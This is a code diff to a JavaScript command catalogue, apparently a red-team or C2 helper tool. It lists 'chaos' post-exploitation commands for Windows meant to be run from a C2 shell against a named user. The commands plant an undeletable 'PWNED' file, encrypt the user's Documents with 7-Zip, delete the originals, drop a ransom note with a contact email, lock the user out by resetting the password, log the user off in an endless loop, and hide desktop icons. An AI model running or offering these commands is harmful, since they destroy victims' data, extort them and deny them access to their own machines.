@@ -3018,8 +3018,8 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[CHAOS] Undeletable File on Desktop",
-    desc: "Run as SYSTEM. Creates file owned by SYSTEM with explicit DENY on user delete. They see it but can't remove it. Change 'adminvm1' to target username.",
-    code: "echo 'YOU HAVE BEEN PWNED' > C:\\Users\\adminvm1\\Desktop\\PWNED.txt; takeown /f C:\\Users\\adminvm1\\Desktop\\PWNED.txt /a; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /setowner 'NT AUTHORITY\\SYSTEM'; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /inheritance:r; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /grant:r 'NT AUTHORITY\\SYSTEM':F; icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /deny adminvm1:(DE,DC)",
+    desc: "Run as SYSTEM. Creates file owned by SYSTEM with explicit DENY on delete. Run each line separately in C2 shell.",
+    code: "echo PWNED > C:\\Users\\adminvm1\\Desktop\\PWNED.txt\\ntakeown /f C:\\Users\\adminvm1\\Desktop\\PWNED.txt\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /setowner SYSTEM\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /inheritance:r\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /grant SYSTEM:F\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /deny adminvm1:D",
     tags: ["cmd", "chaos", "postexploit"],
     accent: "#ff2a6d"
   },
@@ -3039,42 +3039,42 @@ const COMMANDS = [
   },
   {
     title: "[CHAOS] Change Wallpaper",
-    desc: "Changes current user's wallpaper. First upload your image to C:\\Windows\\Temp\\pwned.jpg. UpdatePerUserSystemParameters refreshes without logout.",
-    code: "reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
+    desc: "Changes wallpaper. First download image to C:\\Windows\\Temp\\pwned.jpg then run this.",
+    code: "reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f\\nRUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Set Wallpaper for All Users",
-    desc: "Uses Group Policy CSP to force wallpaper for ALL users. Requires SYSTEM or Admin. Persists across reboots. Upload image first.",
-    code: "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' /v DesktopImagePath /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f; reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP' /v DesktopImageStatus /t REG_DWORD /d 1 /f",
+    desc: "Forces wallpaper for ALL users via GPO. Requires SYSTEM. Persists across reboots.",
+    code: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\" /v DesktopImagePath /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f\\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\" /v DesktopImageStatus /t REG_DWORD /d 1 /f",
     tags: ["cmd", "chaos", "persist"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Encrypt User's Files (7zip)",
-    desc: "Downloads 7zip, installs silently, encrypts Documents folder with password. Replace YOURPASSWORD. -mhe=on hides filenames inside archive.",
-    code: "IWR -Uri 'https://www.7-zip.org/a/7z2301-x64.exe' -OutFile C:\\Windows\\Temp\\7z.exe; C:\\Windows\\Temp\\7z.exe /S; & 'C:\\Program Files\\7-Zip\\7z.exe' a -p'YOURPASSWORD' -mhe=on C:\\Windows\\Temp\\encrypted.7z C:\\Users\\adminvm1\\Documents\\*",
+    desc: "Step 1: Download 7zip. Step 2: Install silently. Step 3: Encrypt Documents. Run each line separately.",
+    code: "IWR -Uri https://www.7-zip.org/a/7z2301-x64.exe -OutFile C:\\Windows\\Temp\\7z.exe\\nC:\\Windows\\Temp\\7z.exe /S\\nStart-Sleep 10\\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -pPWNED123 -mhe=on C:\\Windows\\Temp\\encrypted.7z C:\\Users\\adminvm1\\Documents\\*",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Delete Original After Encrypt",
-    desc: "Run AFTER encrypting. Deletes original files and drops ransom note. Make sure encrypted.7z exists first or data is gone forever.",
-    code: "Remove-Item C:\\Users\\adminvm1\\Documents\\* -Recurse -Force; Copy-Item C:\\Windows\\Temp\\README.txt C:\\Users\\adminvm1\\Documents\\",
+    desc: "Run AFTER encrypting. Deletes original files. MAKE SURE encrypted.7z exists first.",
+    code: "Remove-Item C:\\Users\\adminvm1\\Documents\\* -Recurse -Force",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Create Ransom Note",
-    desc: "Creates text file on desktop. Edit message and email. Run before 'Delete Original' so note gets copied to Documents too.",
-    code: "echo 'Your files have been encrypted. Contact psycho@proton.me for recovery.' > C:\\Users\\adminvm1\\Desktop\\README.txt",
-    tags: ["cmd", "chaos"],
+    desc: "Drops ransom note on desktop. Edit message as needed.",
+    code: "Set-Content C:\\Users\\adminvm1\\Desktop\\README.txt 'Your files have been encrypted. Contact psycho@proton.me for recovery.'",
+    tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Lock User Out (Change Password)",
-    desc: "Changes user password immediately. They get locked out of their session. Requires Admin/SYSTEM. Use 'net user USERNAME /active:no' to also disable account.",
+    desc: "Changes adminvm1 password to H4CK3D123! - they get locked out immediately. Run as SYSTEM.",
     code: "net user adminvm1 H4CK3D123!",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
@@ -3095,8 +3095,8 @@ const COMMANDS = [
   },
   {
     title: "[CHAOS] Continuous Logoff (Annoying)",
-    desc: "Infinite loop that logs off target user every 5 seconds. They login, get kicked, repeat. Change 'adminvm1' to target. Ctrl+C in beacon to stop.",
-    code: "while ($true) { quser | Select-String 'adminvm1' | ForEach-Object { $id = ($_ -split '\\s+')[3]; logoff $id }; Start-Sleep 5 }",
+    desc: "Logs off adminvm1 every 5 seconds. They login, get kicked, repeat. Ctrl+C to stop.",
+    code: "while ($true) { quser | Select-String adminvm1 | % { logoff ($_ -split '\\s+')[3] }; Start-Sleep 5 }",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
@@ -3137,8 +3137,8 @@ const COMMANDS = [
   },
   {
     title: "[CHAOS] Hide All Desktop Icons",
-    desc: "Hides all desktop icons via registry. Explorer restart applies change immediately. Set to 0 to show icons again.",
-    code: "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' /v HideIcons /t REG_DWORD /d 1 /f; Stop-Process -Name explorer -Force; Start-Process explorer",
+    desc: "Hides all desktop icons. Explorer restart applies change. Set to 0 to show again.",
+    code: "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v HideIcons /t REG_DWORD /d 1 /f\\nStop-Process -Name explorer -Force\\nStart-Process explorer",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
